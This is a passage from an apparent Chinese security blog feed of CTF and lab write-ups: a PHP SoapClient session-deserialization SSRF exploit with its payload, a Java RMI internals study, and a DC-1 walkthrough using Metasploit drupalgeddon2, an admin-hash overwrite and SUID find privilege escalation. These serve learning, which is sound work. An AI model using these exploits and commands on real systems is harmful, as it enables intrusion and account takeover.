title="寻找反序列化点"></a>寻找反序列化点</h4><p>这里最可能存在反序列化点的就是session反序列化了。能够触发session反序列化的就是不同的处理器，在这里我们能控制处理器吗？</p><h5 id="php7新特性"><a href="#php7新特性" class="headerlink" title="php7新特性"></a>php7新特性</h5><blockquote><p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p></blockquote><p>那么也就是说我们可以通过session_start来控制处理器来触发session反序列化。session.serialize_handler默认值是php，如果存储session的时候修改处理器为php_serialize，恶意session值为|+序列化攻击串，那么读的时候就以php来读，它就会反序列化我们的攻击串。（session反序列化具体细节不再说了）</p><h4 id="寻找-call函数触发点"><a href="#寻找-call函数触发点" class="headerlink" title="寻找__call函数触发点"></a>寻找__call函数触发点</h4><p>我们上面讲的就是序列化串就是SoapClient原生类。需要在它反序列化的时候去触发__call方法实现SSRF。触发call方法的点就是把SoapClient类当作php函数来执行，仔细看代码好像没有什么能够满足的地方。这里可以利用extract函数来进行变量覆盖，别忘了extract也是接收数组参数的。覆盖掉$b的值，把它的值修改为call_user_func，让name参数去赋值为SoapClient类，到最后一个回调函数的时候，call_user_func会调用SoapClient函数，参数为welcome_to_the_lctf2018。这样就满足call魔术方法的触发条件了，个人感觉这是本题目最巧妙的地方了。</p><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>首先生成序列化串，编写exp：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;XiLitter\r\nCookie:PHPSESSID=123456&quot;</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;XiLitter&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$url</span>));</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="variable">$ser</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的序列化串为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A8%3A%22XiLitter%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22XiLitter%0D%0ACookie%3APHPSESSID%3D123456%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>以php_serialize写进去。</p><img src="/2023/04/28/bestphp-s-revenge%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/1.png" class><p>然后触发call方法，代码中是有读session的操作的，所以这里是反序列化了的。</p><img src="/2023/04/28/bestphp-s-revenge%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/2.png" class><p>我们自己设置的session值是123456，flag文件中说了会把flag写进session里，而且代码中会把session给打印出来，所以这里直接改session值访问一下就能出flag了。</p><img src="/2023/04/28/bestphp-s-revenge%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/3.png" class>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变量覆盖 </tag>
            
            <tag> session反序列化 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由浅入深学习RMI(未完)</title>
      <link href="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/"/>
      <url>/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h2><p>RMI是Java中的一种远程方法调用技术，全称为Remote Method Invocation（远程方法调用）。它使得在不同的Java虚拟机（JVM）之间通过网络进行通信变得容易，使得一个Java应用程序能够调用另一个Java应用程序中的方法，就好像它们都在同一个虚拟机中一样。总的来说，它是一种远程方法调用的具体实现。那么在网络中调用方法，我们传递的信息可能是以序列化的形式传输，可能会存在反序列化漏洞，这也是这篇文章分析RMI的最终目的。</p><h2 id="RMI案例讲解"><a href="#RMI案例讲解" class="headerlink" title="RMI案例讲解"></a>RMI案例讲解</h2><h4 id="远程接口"><a href="#远程接口" class="headerlink" title="远程接口"></a>远程接口</h4><p>首先我们需要定义一个远程接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个远程接口，继承java.rmi.Remote接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">Hello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Remote接口是一个标记接口，本身不提供任何方法，继承它的接口对象定义的方法都能够被RMI java虚拟机调用。</p><h4 id="远程接口实现类"><a href="#远程接口实现类" class="headerlink" title="远程接口实现类"></a>远程接口实现类</h4><p>需要我们写一个实现类来重写方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="comment">// 远程接口实现类，继承UnicastRemoteObject类和Hello接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImp</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">HelloImp</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(); <span class="comment">// 调用父类的构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome to &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程对象必须继承UnicastRemoteObject类，用于生成存根(stub)和骨架(Skeleton)，这两个就类似于代理。客户端和服务端之间的通信其实是这两个代理之间的通信，下文会详细说。</p><h4 id="RMI服务端"><a href="#RMI服务端" class="headerlink" title="RMI服务端"></a>RMI服务端</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">HelloInterface</span> <span class="variable">h</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImp</span>(); <span class="comment">// 创建远程对象HelloImp对象实例</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 获取RMI服务注册器</span></span><br><span class="line">            Naming.rebind(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>,h); <span class="comment">// 绑定远程对象HelloImp到RMI服务注册器</span></span><br><span class="line">            System.out.println(<span class="string">&quot;RMIServer start successful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例化一个远程对象，获取一个RMI注册机，RMI注册机就类似于一种映射，通过一个字符串来绑定一个对象，1099端口是注册机默认的端口，最后会把我们的远程对象绑定到hello。</p><h4 id="RMI客户端"><a href="#RMI客户端" class="headerlink" title="RMI客户端"></a>RMI客户端</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">HelloInterface</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloInterface) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.Hello(<span class="string">&quot;china&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端的代码逻辑很简单，获取注册中心，然后在注册中心上查找有没有hello绑定的远程对象，如果有，获取到远程对象并且调用方法。没有就抛出异常了。运行一下看看效果。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/1.png" class><p>成功调用远程对象的方法。跟着运行一遍对RMI服务的流程也算大致了解，但只是停留在表面，所以还需要分析原理，了解反序列化产生的原因。</p><h2 id="RMI原理讲解"><a href="#RMI原理讲解" class="headerlink" title="RMI原理讲解"></a>RMI原理讲解</h2><p>（ps:在网上找到一位师傅的博客，里面的一张图我觉得很好借用一下，师傅博客文章放在本文最下面）</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/2.png" class><p>这张图的思路非常清晰，下面通过调试来了解具体RMI服务的流程。</p><h4 id="远程对象的创建"><a href="#远程对象的创建" class="headerlink" title="远程对象的创建"></a>远程对象的创建</h4><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/3.png" class><p>我们在这里下个断点，创建远程对象至始至终都是服务端干的事情，所以这里肯定是不会产生漏洞的，那就简单分析一下，走到UnicastRemoteObject类的构造方法，里面调用了exportObject函数，看名字就类似于发布对象的意思。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/4.png" class><p>跟进函数，有两个参数，其中一个就是远程对象，另一个是UnicastServerRef对象，跟进。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/5.png" class><p>又实例化了LiveRef类，这里的port默认为0，后面会随机给。LiveRef类是比较重要的，跟进一下这个类。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/6.png" class><p>这里的TCPEndpoint是真正处理网络请求的类，在这个getLocalEndpoint方法获取到ip地址。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/7.png" class><p>所以LiveRef类是处理网络请求的，回到最初的exportObject函数这里。我们会发现UnicastServerRef对象就是一路封装过来的处理网络请求的。再跟进到那个函数里面，走到UnicastServerRef类的exportObject函数里。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/8.png" class><p>这里会创建一个stub，这个stub就是客户端处理的代理。事实上客户端的stub就是在服务端创建的，然后由服务端放到注册中心，再由客户端向注册中心里拿，利用这个stub来操作服务端的代理。有兴趣可以跟一下createProxy函数，就是一个创建动态代理的过程。最后会创建一个target，进行一个总的封装。然后继续调用exportObject函数，一路跟进会走到listen函数里</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/9.png" class><p>在这里面就会开启一个新的网络请求来等待客户端连接，从而调用远程方法。最后就是一路返回了，远程对象的创建流程就到此结束。</p><h4 id="注册中心的创建"><a href="#注册中心的创建" class="headerlink" title="注册中心的创建"></a>注册中心的创建</h4><p>在创建注册中心那里下个断点。调试走到RegistryImpl的构造函数。把1099端口传进去，通过一系列的安全检查，我们最终会走到这里。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/10.png" class><p>这里就和远程对象创建那一块很像了。自己可以跟一下，其实就是一样的。进入到setup函数，</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/11.png" class><p>实际上也是调用了UnicastServerRef类的exportObject函数。而有区别的地方就是在createProxy函数里面，远程对象那部分是创建一个动态代理，而注册中心这部分并不是，它会走到if判断里面。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/12.png" class><p>跟进函数看一下。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/13.png" class><p>其实就是判断有没有类名_Stub这样的东西，实际上是有的。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/14.png" class><p>最后进入到createStub函数，通过newInstance创建。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/15.png" class><p>它最后会调用setSkeleton函数里面，这个函数就是为服务端创建Skeleton的，具体细节不再跟了。接着也会创建一个总的封装Target。最后会put到哈希表里。</p><h4 id="客户端请求注册中心"><a href="#客户端请求注册中心" class="headerlink" title="客户端请求注册中心"></a>客户端请求注册中心</h4><p>首先就是客户端获取到注册中心，它这里是把注册中心的ip和端口拿过来本地创建了一个LiveRef。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/16.png" class><p>最后调用createProxy函数本地创建了一个Stub，接着也是对这个Stub进行处理，查找远程对象。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/19.png" class><p>跟进lookup，是反编译出来的代码，静态去看。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/20.png" class><p>接收一个字符串，第一行代码就是创建一个连接，然后把我传进去的字符串序列化写进一个流里，然后会调用一个invoke，这个方法跟进去看就知道有个executeCall方法是处理网络请求的。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/21.png" class><p>后来会接收一个输入流，然后反序列化，这里会存在一个漏洞点，如果有一个恶意的注册中心，返回一个恶意的流，在客户端反序列化就会执行代码。还有一个漏洞点就是invoke那里，在executeCall函数，有一个异常处理存在反序列化，也会导致客户端被攻击</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/22.png" class><h4 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h4><p>调用Hello方法，因为查找的远程对象是一个动态代理，它会走到RemoteObjectInvocationHandler类的invoke方法，里面还有invoke方法，继续跟进。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/23.png" class><p>也是创建了一个连接。这里有一个marshalValue函数，跟进去看就知道它会序列化调用方法参数的值，继续往下走。</p><img src="/2023/04/21/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0RMI/24.png" class><p>这里有一个unmarshalValue函数，和marshalValue方法是对应的，它会反序列化从服务端接收过来的返回值，这里也能打客户端的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这篇文章算是一个半成品，因为漏洞利用这一块还没有讲。一个原因是因为理解不到位，这块该说不说还挺复杂的，另一个原因是因为真的不想再看这东西了。打算先学学后面的知识，经过时间的沉淀再回头看应该会有不一样的理解。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机通关记录</title>
      <link href="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><blockquote><p>局域网网段：192.168.47.0&#x2F;24</p><p>攻击机 kali：192.168.47.128&#x2F;24</p><p>目标器 DC-1：192.168.47.135&#x2F;24</p></blockquote><h3 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h3><blockquote><p>找到藏在DC-1靶机中的五个flag。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>已知目标机器与我们的攻击机在同一个网段，为192.168.47.0&#x2F;24。</p><h4 id="寻找靶机真实IP"><a href="#寻找靶机真实IP" class="headerlink" title="寻找靶机真实IP"></a>寻找靶机真实IP</h4><p>利用nmap探测局域网内存活的主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.47.0/24</span><br></pre></td></tr></table></figure><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/1.png" class><p>已知kali机IP为192.168.47.128，所以目标机器IP为192.168.47.135</p><h4 id="探测端口以及服务"><a href="#探测端口以及服务" class="headerlink" title="探测端口以及服务"></a>探测端口以及服务</h4><p>nmap命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -v 192.168.47.135</span><br></pre></td></tr></table></figure><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2.png" class><p>目标机器开放了22端口，开启远程连接服务。80端口，开启web服务，使用的框架为Drupal 7。111端口，开放了rpcbind服务。访问web站点</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/3.png" class><h3 id="MSF渗透"><a href="#MSF渗透" class="headerlink" title="MSF渗透"></a>MSF渗透</h3><p>百度Drupal 7版本存在很多漏洞，比如远程代码执行。正好Metersploit工具中有Drupal漏洞攻击模块。可以用此工具来进行攻击，拿到目标机器的shell。</p><h4 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole </span><br></pre></td></tr></table></figure><p>开启MSF工具控制台。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal 7</span><br></pre></td></tr></table></figure><p>搜索框架历史漏洞。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/4.png" class><p>之前网上百度该框架2018年爆出一个远程代码执行的CVE漏洞，那么就用此模块来打。选择此模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p>设置目标主机IP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.47.135</span><br></pre></td></tr></table></figure><p>然后执行exp攻击，拿到目标主机的shell。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5.png" class><h4 id="python反弹交互式shell"><a href="#python反弹交互式shell" class="headerlink" title="python反弹交互式shell"></a>python反弹交互式shell</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>这行代码利用pty模块中的spawn函数，将当前程序的标准输入、输出和错误重定向到一个新的终端窗口中，从而获得一个交互式的shell环境。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6.png" class><h3 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h3><h4 id="发现flag1"><a href="#发现flag1" class="headerlink" title="发现flag1"></a>发现flag1</h4><p>在当前的web目录发现flag1.txt，打开获得提示。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/7.png" class><p>提示我们查找配置文件，百度Drupal框架的配置文件在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure><h4 id="发现flag2"><a href="#发现flag2" class="headerlink" title="发现flag2"></a>发现flag2</h4><p>打开配置文件，发现flag2.</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/8.png" class><p>此外还有数据库的一些敏感信息，利用这些信息我们可以登录数据库。</p><h5 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h5><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9.png" class><p>查看user表发现admin的登录信息。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/10.png" class><p>可惜管理员的密码被hash加密了。不过Drupal框架内设置了可以置换管理员密码的功能。相关链接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://drupalchina.cn/node/2128</span><br></pre></td></tr></table></figure><h5 id="置换管理员密码"><a href="#置换管理员密码" class="headerlink" title="置换管理员密码"></a>置换管理员密码</h5><p>在Drupal框架中有一个生成hash的脚本文件，我们可以将指定密码的hash值替换进去。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/11.png" class><p>利用mysql的update更新语句将管理员密码替换为我们所设置的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass=&quot;$S$D.hNM63.5sEpCaL0K/Qcv4LazQn0MuHsQcyCv8KUxVoAS1zfzwAV&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/12.png" class><h4 id="发现flag3"><a href="#发现flag3" class="headerlink" title="发现flag3"></a>发现flag3</h4><p>把管理员密码修改后直接登录网站。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/13.png" class><p>直接登陆进后台，随便看看，找到flag3</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/14.png" class><p>下面文字提示我们要通过find命令来提权。</p><h4 id="发现flag4"><a href="#发现flag4" class="headerlink" title="发现flag4"></a>发现flag4</h4><h5 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h5><p>在&#x2F;home&#x2F;flag4目录下发现flag4.txt，用cat查看提示说需要提权。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/15.png" class><p>使用find命令查看设置有suid权限的可执行文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/16.png" class><p>发现find命令设置有suid权限，用find来执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name 111 -exec &quot;whoami&quot; \;</span><br></pre></td></tr></table></figure><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/17.png" class><p>是root权限，直接开始提权。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/18.png" class><p>提权成功为root</p><h4 id="找到finalflag"><a href="#找到finalflag" class="headerlink" title="找到finalflag"></a>找到finalflag</h4><p>切换到root目录，发现最后的flag，此时已经为最高权限，直接查看文件内容。</p><img src="/2023/04/08/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/19.png" class><p>Well done!!!本靶场已经全部通关。</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro反序列化-CB链利用</title>
      <link href="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/"/>
      <url>/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="commons-beanutils简介"><a href="#commons-beanutils简介" class="headerlink" title="commons-beanutils简介"></a>commons-beanutils简介</h2><p>它也是Apache Commons项目的一个Java类库，提供了一组简单易用的API来操作Java对象和Bean属性。它的主要功能是将Java Bean的属性值与一组键值对（例如，从HTTP请求或表单参数中）相互转换。主要对javaBean功能的增强。它是shiro自带的依赖，此依赖也存在反序列化漏洞。</p><h2 id="什么是javaBean"><a href="#什么是javaBean" class="headerlink" title="什么是javaBean"></a>什么是javaBean</h2><p>JavaBean是一种特定的Java类，它遵循一定的规范和格式，以便于被其他程序使用和操作。写一个javaBean格式的类吧，举个例子一看就懂，平常我们也经常写。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Persion</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Persion</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    